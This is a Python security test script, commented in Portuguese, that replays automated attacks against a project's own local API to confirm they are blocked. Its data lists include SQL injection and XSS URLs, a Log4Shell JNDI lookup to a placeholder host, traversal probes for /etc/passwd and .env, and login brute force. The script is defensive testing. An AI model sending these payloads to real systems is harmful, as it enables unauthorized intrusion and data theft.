"""Simulação de ataques automatizados contra a API.

Para cada ataque a API é reiniciada (os bloqueios ficam em memória) e o teste confere:
  1. antes do ataque, um navegador comum é atendido;
  2. o ataque é recusado ou detectado;
  3. depois do ataque, o mesmo IP fica bloqueado, mesmo usando um navegador comum.

Uso (na raiz do projeto, com o .venv ativo):  python tests/seguranca/ataques.py
Leva cerca de 1 minuto, porque a API é reiniciada a cada caso.
"""
import sys

from _servidor import Placar, Servidor, cabecalhos_escrita, requisitar

SCANNERS = [
    "sqlmap/1.8",
    "Mozilla/5.00 (Nikto/2.5.0)",
    "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
    "Fuzz Faster U Fool v2.1.0",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
    "WPScan v3.8",
    "gobuster/3.6",
    "masscan/1.3",
]

SONDAGENS = ["/.env", "/.git/config", "/wp-login.php", "/api/../../etc/passwd", "/phpmyadmin/", "/backup.zip", "/actuator/health"]

INJECOES = [
    ("SQL injection", "/api/fiscal/busca?query=1%27%20UNION%20SELECT%20senha%20FROM%20usuarios--"),
    ("SQL injection por tempo", "/api/fiscal/busca?query=1%27%20AND%20SLEEP(5)--"),
    ("XSS refletido", "/status?q=%3Cscript%3Ealert(1)%3C/script%3E"),
    ("Log4Shell", "/status?x=${jndi:ldap://exemplo/a}"),
    ("travessia de diretório", "/status?arquivo=..%2F..%2Fetc%2Fpasswd"),
]


def caso(p, srv, nome, ataque):
    srv.reiniciar()
    antes = requisitar("GET", "/status")[0]
    resultado = ataque()
    depois = requisitar("GET", "/status")[0]
    p.conferir(nome, antes == 200 and resultado in (403, 404, 429) and depois == 403,
               f"antes={antes}, ataque={resultado}, depois={depois}")


def main():
    p = Placar("Simulação de ataques automatizados")
    srv = Servidor()
    try:
        srv.iniciar()

        print("\n-- Ferramentas de varredura conhecidas (identificadas pelo User-Agent)")
        for agente in SCANNERS:
            caso(p, srv, f"scanner: {agente[:40]}", lambda a=agente: requisitar("GET", "/status", agente=a)[0])
        caso(p, srv, "requisição sem User-Agent", lambda: requisitar("GET", "/status", agente="")[0])

        print("\n-- Sondagem de arquivos e painéis que o sistema não tem")
        for caminho in SONDAGENS:
            caso(p, srv, f"sondagem: {caminho}", lambda c=caminho: requisitar("GET", c)[0])

        print("\n-- Tentativas de injeção na URL")
        for nome, caminho in INJECOES:
            caso(p, srv, nome, lambda c=caminho: requisitar("GET", c)[0])

        print("\n-- Varredura de diretórios por força bruta")
        # a 15ª rota inexistente ainda recebe 404; o bloqueio vale a partir da seguinte
        caso(p, srv, "15 rotas inexistentes em sequência", lambda: [requisitar("GET", f"/pagina{i}")[0] for i in range(15)][-1])

        print("\n-- Força bruta de senha")
        srv.reiniciar()
        H = cabecalhos_escrita()
        tentativas = [requisitar("POST", "/api/fiscal/login", {"usuario": "fiscal", "senha": f"chute{i}"}, H)[0] for i in range(6)]
        p.conferir("5 senhas erradas travam o login", tentativas == [401] * 5 + [429], tentativas)
        certa = requisitar("POST", "/api/fiscal/login", {"usuario": "fiscal", "senha": "sorocaba2026"}, H)[0]
        p.conferir("senha certa durante a trava continua barrada", certa == 429, certa)
        carteira = requisitar("POST", "/api/carteira/acesso", {"cpf": "12345678901", "data_nascimento": "12/04/1978"}, H)[0]
        p.conferir("a trava vale também para o acesso à carteira", carteira == 429, carteira)

        srv.reiniciar()
        H = cabecalhos_escrita()
        respostas = [requisitar("POST", "/api/carteira/acesso", {"cpf": "12345678901", "data_nascimento": f"0{i}/01/1980"}, H)[0] for i in range(1, 7)]
        p.conferir("5 datas de nascimento erradas travam a carteira", respostas[:5] == [404] * 5 and respostas[5] == 429, respostas)

        print("\n-- Excesso de requisições")
        srv.reiniciar()
        # a checagem de que o servidor subiu já gastou 1 requisição da cota
        respostas = [requisitar("GET", "/status")[0] for _ in range(125)]
        primeiro = respostas.index(429) + 2 if 429 in respostas else None
        p.conferir("a partir da 121ª requisição no minuto a resposta é 429", primeiro == 121, f"primeiro 429 na requisição {primeiro}")
    finally:
        srv.parar()
    return p.encerrar()


if __name__ == "__main__":
    sys.exit(main())
